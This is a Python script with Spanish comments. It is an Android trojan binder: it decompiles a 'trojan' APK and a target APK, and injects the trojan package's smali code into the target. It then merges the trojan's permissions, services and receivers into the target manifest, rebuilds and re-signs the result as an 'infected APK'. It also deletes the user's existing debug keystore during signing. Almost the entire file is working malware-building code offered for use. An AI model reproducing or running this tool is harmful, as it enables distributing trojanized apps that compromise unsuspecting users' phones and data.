#!/usr/bin/python

#almacena estrucuras de datos jerarquicas en memoria
import xml.etree.ElementTree as ET
#escritura de archivos 
import fileinput
#llamadas al sistema
from subprocess import call 
#facilita uso de argumentos
import argparse 
#funcionaldiades del SO
import os
#realizar operaciones con archivos
import shutil
#uso de variables del interprete
import sys
#busquedas en directorios
import glob


#apktool = os.path.expanduser('~') + "/Documents/mixapk/apktool/apktool"
#androidSdk= os.path.expanduser('~') + "/Documents/mixapk/Android/Sdk/"
apktool = os.getcwd()+'/apktool/apktool'
androidSdk= os.getcwd() +'/android/sdk/'

#########Seccion para fijar rutas 

TempDirectory = '/tmp/MixApk/'

packageToInject = 'trojan.android.android_trojan.action'

apk1 = TempDirectory + 'apk1.apk'
apk2 = TempDirectory + 'apk2.apk'

apk1Directory = TempDirectory + 'apk1/'
apk2Directory = TempDirectory + 'apk2/'

apk1Manifest = apk1Directory + 'AndroidManifest.xml'
apk2Manifest = apk2Directory + 'AndroidManifest.xml'

apk1Smali = apk1Directory + 'smali/'
apk2Smali = apk2Directory + 'smali/'

apk2Dist = apk2Directory + 'dist/'
apk2DistApk = apk2Dist + 'apk2.apk'

###########################################

class ParseArgs:
   
    def __init__(self):
	#Definiendo los argumentos y creando un apartado de ayuda 
        self.parser = argparse.ArgumentParser(description='ACTION')
        self.parser.add_argument('--apks', dest='apks', action='store', metavar=('ApkTroyano', 'APKaInfectar'), nargs=2,
                                 default=False, help='Especifica el APK Troyano y el APK a infectar')

	self.parser.add_argument('-o', dest='out', action='store', metavar=('APKinfectada.apk'), nargs=1,
                                 default=False, help='Especifica el nombre del APK infectado')

        self.args = self.parser.parse_args()

#obtiene argumentos
    def getargs(self):
        return self.args


class ParseManifest:
    def __init__(self, manifest):
	#Resgistar prefijo de namespace --> (prefix,namespace)
	#el  namesoace android siempre esta en http://schemas.android.com/apk/res/android
        ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
        self.file = manifest
	#parseo de mainfest (permisos)
        self.manifest = ET.parse(manifest)
        self.root = self.manifest.getroot()
	#busca la seccion application
        self.application = self.manifest.find('application')
        self.permissions = []
        self.services = []
        self.receiver = []
        self.nodePermissions = []
        self.nodeServices = []
        self.nodeReceiver = []
        self.mainactivity = None
        self.mainpackage = None

    def findMainActivity(self):
	#si mainactiity esta vacio, copia el mainactivity y le regresa
        if self.mainactivity is None:
            for child in self.root.iter('activity'):
                for child0 in child:
                    for child1 in child0:
                        if child1.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                            self.mainactivity = child.get('{http://schemas.android.com/apk/res/android}name')
                            return self.mainactivity
        else:
            return self.mainactivity

    def findMainPackage(self, ): 
	#Obtine MAinPackage y lo devuelce
        if self.mainpackage is None:
            self.mainpackage = self.root.get('package')
        return self.mainpackage

    def listPermissions(self):
	#Obtiene Permisos y lo regresa
        if len(self.permissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.permissions.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.permissions

    def listService(self):
	#obtiene Servicios y lo devuelve
        if len(self.services) == 0:
            for child in self.root.iter('service'):
                self.services.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.services

    def listReceiver(self):
	#obtiene listReceiver y lo devuelve
        if len(self.receiver) == 0:
            for child in self.root.iter('receiver'):
                self.receiver.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.receiver

    def listNodePermissions(self):
	#obtiene listNodePermissions  lo devuelve
        if len(self.nodePermissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.nodePermissions.append(child)
        return self.nodePermissions

    def listNodeService(self):
	#obtiene listNodeService y lo devuelve
        if len(self.nodeServices) == 0:
            for child in self.root.iter('service'):
                self.nodeServices.append(child)
        return self.nodeServices

    def listNodeReceiver(self):
	#obtiene listNodeReceiver y lo devuelve
        if len(self.nodeReceiver) == 0:
            for child in self.root.iter('receiver'):
                self.nodeReceiver.append(child)
        return self.nodeReceiver

#Clase para modificar el Manifest
class EditManifest(ParseManifest):
	#Se obtiene el manifest de la ruta
    def __init__(self, manifest):
        ParseManifest.__init__(self, manifest=manifest)
	#Se escribe el mainifest

    def write(self):
        self.manifest.write(self.file)

	#se agregan servicios
    def addService(self, node, mainpackage):
        if type(node) is list:
            for service in node:
                service.set('{http://schemas.android.com/apk/res/android}name',
                            service.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
                self.application.append(service)
        else:
            node.set('{http://schemas.android.com/apk/res/android}name',
                            node.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
            self.application.append(node)
        self.write()
	
	#agrega Receiver
    def addReceiver(self, node, mainpackage):
        if type(node) is list:
            for receiver in node:
                receiver.set('{http://schemas.android.com/apk/res/android}name',
                            receiver.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
                self.application.append(receiver)
        else:
            node.set('{http://schemas.android.com/apk/res/android}name',
                            node.get('{http://schemas.android.com/apk/res/android}name').replace(mainpackage, self.findMainPackage()))
            self.application.append(node)
        self.write()

	#Agrega los permisos 
    def addPermissions(self, node):
        if type(node) is list:
            for permission0 in node:
                change = True
                for permission1 in self.listPermissions():
                    if permission0.get('{http://schemas.android.com/apk/res/android}name') == permission1:
                        change = False
                if change:
                    self.root.append(permission0)
        else:
            for permission in self.listPermissions():
                if permission == node.get('{http://schemas.android.com/apk/res/android}name'):
                    return
            self.root.append(node)
        self.write()

#salida en caso de error
def error(message, ex, code):
    print(message)
    if ex:
        print(ex)
    sys.exit(code)


#crea un nuevo archivo
def sed(file, old, new):
    for line in fileinput.input(file, inplace=True):
        print(line.replace(old, new))


#se crea el directorio temporal en caso de no existir
if not os.path.exists(TempDirectory):
    os.makedirs(TempDirectory)

#copiar argumentos a args
args = ParseArgs().getargs()

#verifica la ruta de apktool
if not os.path.isfile(apktool):
    error("apktool no esta en la ruta: " + apktool, None, 1)

#verifica la ruta de androidSdk
if not os.path.exists(androidSdk):
    error("android SDK no esta en la ruta: " + androidSdk, None, 1)

#Verifica que se haya un nombre al apk final
if args.out[0]:
	out=args.out[0]
else:
	error("Especifica un nombre para la apk infectada. Uso : mixapk.py --apks apk1.apk apk2.apk -o apk3.apk", None ,1)

#Verifica que las apks (ApkTrojano y ApkOriginal) existan y las copia a directrio temporal
if args.apks and os.path.isfile(args.apks[0]) and os.path.isfile(args.apks[1]):
    try:
        shutil.copyfile(args.apks[0], apk1)
        shutil.copyfile(args.apks[1], apk2)
    except IOError as ex:
        error("No se pudieron copiar las apks a  " + TempDirectory, str(ex), 1)
else:
    error("Especifica dos Apks en la linea de comandos, Uso : mixapk.py --apks apk1.apk apk2.apk -o apk3.apk", None, 2)


try:
	#Llama a apktool para decomplilar las apks
    call(apktool + " d -v -f -o " + apk1Directory + " " + apk1, shell=True)
    call(apktool + " d -v -f -o " + apk2Directory + " " + apk2, shell=True)
except OSError as ex:
	#can't extract the two apk
    error("No se pudieron extraer las apks ", str(ex), 1)

ParseManifest1 = ParseManifest(manifest=apk1Manifest)
ParseManifest2 = ParseManifest(manifest=apk2Manifest)

EditManifest1 = EditManifest(manifest=apk1Manifest)
EditManifest2 = EditManifest(manifest=apk2Manifest)

#print str(apk1Manifest)
#print str(apk2Manifest)

apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'

#print str(apk2Action)

#print "Fuente: " + apk1Smali + packageToInject.replace('.', '/') + '/'
#shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/' ,"./smali1")

#print "Destino: " + apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'
#shutil.copytree(apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + '/', "./smali2")


#copia el directorio  recursivamente apk1Smali
shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
            apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')

#Se crean nuevos .smali remplazando el paquete principal 
for file in glob.glob(apk2Action + '*.smali'):
    sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))

EditManifest2.addPermissions(ParseManifest1.listNodePermissions())
EditManifest2.addService(ParseManifest1.listNodeService()[0], ParseManifest1.findMainPackage())
EditManifest2.addReceiver(ParseManifest1.listNodeReceiver(), ParseManifest1.findMainPackage())


#Se compila el nuevo apk
try:
    call(apktool + " b -d -f " + apk2Directory, shell=True)
except OSError as ex:
    error("No se pudo compilar " + apk2Directory , str(ex), 1)



try:
    cd = os.getcwd()
    os.chdir(apk2Dist)

    if os.path.exists(apk2Dist + 'app-debug2.apk'):
        os.remove(apk2Dist + 'app-debug2.apk')
    if os.path.exists(apk2Dist + 'app-debug.apk'):
        os.remove(apk2Dist + 'app-debug.apk')
    if os.path.exists(cd + '/app-debug2.apk'):
        os.remove(cd + '/app-debug2.apk')
    if not os.path.exists(os.path.expanduser('~') + '/.android/'):
        os.makedirs(os.path.expanduser('~') + '/.android/') 
    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')

    shutil.copyfile(apk2DistApk, apk2Dist + 'app-debug.apk')

#The <alignment> is an integer that defines the byte-alignment boundaries. 
#This must always be 4 (which provides 32-bit alignment) or else it effectively does nothing.
    print(androidSdk + 'zipalign -v 4 app-debug.apk app-debug2.apk')

    call(androidSdk + 'zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
    call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
    call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
    call('jarsigner -verify app-debug2.apk', shell=True)

    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')

    shutil.copyfile(apk2Dist + 'app-debug2.apk', cd + '/' + out)
except OSError as ex:
    error("no se pudo compilar " + apk2Directory , str(ex), 1)

